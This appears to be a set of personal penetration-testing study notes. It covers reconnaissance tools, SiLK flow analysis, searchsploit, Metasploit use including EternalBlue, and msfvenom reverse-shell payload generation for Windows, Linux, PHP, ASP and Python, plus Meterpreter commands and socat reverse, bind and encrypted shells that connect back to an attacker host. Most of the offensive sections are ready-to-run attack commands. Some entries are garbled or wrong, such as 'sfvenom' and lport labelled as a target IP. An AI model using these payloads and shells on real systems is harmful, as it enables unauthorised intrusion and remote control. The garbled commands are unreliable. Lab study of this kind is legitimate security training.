# Enumeration Tools

Search engines can reveal a lot about internet-accessible servers and devices. You can use special search operators on Google to find hidden info, or use a specialized search engine like Shodan or Censys.

`Metasplot` has purpose built scanner modules for different services

`Dnsenum` is a DNS harvesting tool that can be used to locate all DNS servers and records for an organization.

`TheHarvester` is an enumeration tool that gathers email accounts, employee names, and other contact information related to people.

`Maltego` 
`Recon-NG` are broad-spectrum tools that can gather a wide variety of OSINT.

`Sn1per`
an automated scanner and exploitation tool which performs OSINT recon, port enumeration, vulnerability scanning, and exploits with minimal human interaction.

`Steghide`
`sudo apt-get install steghide`
Ubuntu steganography app

`captcha22`
CAPTCHA cracker 
(requires training data for ML)
https://github.com/WithSecureLabs/captcha22

`feroxbuster
recursive URL content discovery tool.



---
# Log Analysis from the CLI using Silk

`SiLK` 
helps analysts gain insight into multiple aspects of network behaviour.
```shell-session
rwfileinfo traffic-flows.silk
```
overviewing the file info
`Rwcut`
reads binary flow records and prints those selected by the user in text format
```shell-session
rwfilter suspicious-flows.silk --proto=17 --pass=stdout | rwcut --fields=protocol,sIP,sPort,dIP,dPort --num-recs=5
```
This command filters all UDP records with rwfilter, passes the output to rwcut and displays the first five records with rwcut.
- `rwstats FILENAME --fields=dPort --values=records,packets,bytes,sIP-Distinct,dIP-Distinct --count=10`
    - `--count`: Limits the number of records printed on the console
    - `--values=records,packets,bytes`: Shows the measurement in flows, packets, and bytes
    - `--values=sIP-Distinct,dIP-Distinct`: Shows the number of unique IP addresses that used the filtered field
`rwstats FILENAME --fields=sIP --values=bytes --count=10 --top`
lists the top talkers on the network
`rwfilter FILENAME --aport=53 --pass=stdout | rwstats --fields=sIP,dIP --values=records,bytes,packets --count=10`


---

# MetaSploit 

## Searchsploit 

Search exploitDB
```shell
searchsploit afd windows local
```
We can remove unwanted results by using the `--exclude` option. We are also able to remove multiple terms by separating the value with a `|` (pipe). This can be demonstrated by the following:
```text
kali@kali:~$ searchsploit linux kernel 3.2 --exclude="(PoC)|/dos/"
```
By using `-p`, we are able to get some more information about the exploit, as well as copy the complete path to the exploit onto the clipboard:
```text
kali@kali:~$ searchsploit 39446
```
make a copy of exploits and use them from a working directory. By using the `-m` option, we are able to select as many exploits we like to be copied into the same folder that we are currently in:

```text
kali@kali:~$ searchsploit MS14-040
--------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                         |  Path
--------------------------------------------------------------------------------------- ---------------------------------
Microsoft Windows 7 (x64) - 'afd.sys' Dangling Pointer Privilege Escalation (MS14-040) | exploits/windows_x86-64/local/39525.py
Microsoft Windows 7 (x86) - 'afd.sys' Dangling Pointer Privilege Escalation (MS14-040) | exploits/windows_x86/local/39446.py
--------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Result
kali@kali:~$
kali@kali:~$ searchsploit -m 39446 win_x86-64/local/39525.py
```

## Steps To use MSFCONSOLE:
1. search for the correct module
2. use the `info` command for any module
3. go into module use the `use` command
4. show options
5. set all required options e.g RHOSTS, FILE, USER
6. `run` command to run module
7. find exploitable service 
8. search for exploit
9. go into exploit using the `exploit` command
10. show and set payloads

For example, if you identify a VNC service running on the target, you may use the `search` function on Metasploit to list useful modules. The results will contain payload and post modules.

Opens MSF console
```
msfconsole
```
show modules
```
show 
```
go back
```
back
```
backgrounds session
`background`
view current sessions
`sessions`
swap sessions
`sessions -i [session Number#]`

show info
```
info
```
search exploits
>You can conduct searches using CVE numbers, exploit names (eternalblue, heartbleed, etc.), or target system.
```
search [exploit ]
```
The services command used with the `-S` parameter will allow you to search for specific services in the environment.
```shell-session
services -S netbios
```

Look for low-hanging fruits such as:

- HTTP: Could potentially host a web application where you can find vulnerabilities like SQL injection or Remote Code Execution (RCE). 
- FTP: Could allow anonymous login and provide access to interesting files. 
- SMB: Could be vulnerable to SMB exploits like MS17-010
- SSH: Could have default or easy to guess credentials
- RDP: Could be vulnerable to Bluekeep or allow desktop access if weak credentials were used.

You can also list other available payloads using the `show payloads` command with any module.

use option number 10
```
use 10
```
see exploit options
```
options
```
set options 
```
set RHOSTS
```
set the global value for RHOSTS  to 10.10.19.23
```
setg RHOSTS 10.10.19.23
```
run
```
run
```

then move onto an 'exploit' directory within the msfconsole
```shell-session
msf6 > use exploit/windows/smb/ms17_010_eternalblue 
```

You can also list other available payloads using the `show payloads` command with any module.

Windows set payload option
`set payload windows/x64/shell/reverse_tcp`

Changes regular reverse shell to meterpreter
`use post/multi/manage/shell_to_meterpreter


## scanning using msfconsole

>Metasploit has a number of modules to scan open ports

potential ***port*** scanning modules available
`search portscan`
Port scanning modules will require you to set a few options
```shell-session
msf6 auxiliary(scanner/portscan/tcp) > show options
```
- CONCURRENCY: Number of targets to be scanned simultaneously.
- **PORTS:** Port range to be scanned. Please note that 1-1000 here will not be the same as using Nmap with the default configuration. Nmap will scan the 1000 most used ports, while Metasploit will scan port numbers from 1 to 10000.
- **RHOSTS:** Target or target network to be scanned.
- **THREADS:** Number of threads that will be used simultaneously. More threads will result in faster scans.

You can directly perform Nmap scans from the msfconsole
```shell-session
msf6 > nmap -sS 10.10.12.229
```

---

## Handy msfconsole modules 

Post Module to dump the password hashes for all users on a Linux System
`linux/gather/hashdump
Eternal Blue exploit
`search eternalblue`



---

## msfvenom create payloads

search for payloads
`msfvenom --list payloads | grep "linux/x86/meterpreter"

```
msfvenom -p windows/x64/shell/reverse_tcp -f exe -o shell.exe LHOST=<listen-IP> LPORT=<listen-port>
```
- -p    creates payload
- windows/x64/shell/reverse_tcp     reverse shell for a x86 WIndows Target
- -f    prints to .exe format
- lhost     listen IP
- lport     target IP

generates a staged meterpreter reverse shell for a 64bit Linux target, own IP=10.10.10.5, listening on port 443? The format for the shell is `elf` and the output filename should be "shell"
`msfvenom -p linux/x64/meterpreter/reverse_tcp -f elf -o shell LHOST=10.10.10.5 LPORT=443

>***Encoders*** do not aim to bypass antivirus installed on the target system. As the name suggests, they encode the payload.

The example below shows the usage of encoding (with the `-e` parameter. The PHP version of Meterpreter was encoded in Base64, and the output format was `raw`.
```shell-session
sfvenom -p php/meterpreter/reverse_tcp LHOST=10.10.186.44 -f raw -e php/base64
```

---

## Meterpreter Shells

searches available meterpreter shells
`msfvenom --list payloads | grep meterpreter`

Linux Executable and Linkable Format (elf)
`msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f elf > rev_shell.elf`

Windows  
`msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f exe > rev_shell.exe`  
  
PHP  
`msfvenom -p php/meterpreter_reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f raw > rev_shell.php`  
  
ASP  
`msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f asp > rev_shell.asp`  
  
Python  
`msfvenom -p cmd/unix/reverse_python LHOST=10.10.X.X LPORT=XXXX -f raw > rev_shell.py`

All of the examples above are reverse payloads. This means you will need to have the exploit/multi/handler module listening on your attacking machine to work as a handler.
```
msf6 > use exploit/multi/handler 
set payload php/reverse_php
```

linux handler Meterpreter Handler
`set payload linux/x86/meterpreter/reverse_tcp`

## File system commands within the meterpreter session

- `cd`: Will change directory
- `ls`: Will list files in the current directory (dir will also work)
- `pwd`: Prints the current working directory
- `edit`: will allow you to edit a file
- `cat`: Will show the contents of a file to the screen
- `rm`: Will delete the specified file
- `search`: Will search for files
- `upload`: Will upload a file or directory
- `download`: Will download a file or directory

Meterpreter [CheatSheet](https://scadahacker.com/library/Documents/Cheat_Sheets/Hacking%20-%20Meterpreter%20Cheat%20%20Sheet.pdf)


# socat

https://tryhackme.com/room/introtoshells

## Reverse Shell

basic reverse shell listener in socat
`socat TCP-L:<port> -
	will work on Linux or Windows

windows reverse shell from target
`socat TCP:<LOCAL-IP>:<LOCAL-PORT> EXEC:powershell.exe,pipes
Linux Reverse shell from target
`socat TCP:<LOCAL-IP>:<LOCAL-PORT> EXEC:"bash -li"


## Bind Shell
target command
`socat TCP-L:<PORT> EXEC:"bash -li"
listener for windows
`socat TCP-L:<PORT> EXEC:powershell.exe,pipes
>used to connect from attacking machine
 `socat TCP:<TARGET-IP>:<TARGET-PORT> -

---

## Stable tty reverse shell

Linux Target
`socat TCP:<attacker-ip>:<attacker-port> EXEC:"bash -li",pty,stderr,sigint,setsid,sane`
l
istener
``sudo socat TCP-L:<port> FILE:`tty`,raw,echo=0``

As usual, we're connecting two points together. In this case those points are a listening port, and a file. Specifically, we are passing in the current TTY as a file and setting the echo to be zero. This is approximately equivalent to using the Ctrl + Z

>https://tryhackme.com/room/introtoshells

---
## Encrypted Shells

- Create Certificate
`openssl req --newkey rsa:2048 -nodes -keyout shell.key -x509 -days 362 -out shell.crt`
- We then need to merge the two created files into a single `.pem` file:
`cat shell.key shell.crt > shell.pem`
- Now, when we set up our reverse shell listener, we use:
`socat OPENSSL-LISTEN:<PORT>,cert=shell.pem,verify=0 -`
- To connect back, we would use:
`

# Git

`git clone http://10.10.138.162:3000/McHoneyBell/gift-wrapper-pipeline.git`-
Once cloned, we can make any changes we wish, then "commit" the changes
`git add .`

`git commit -m "<message here>"`  

`git push`


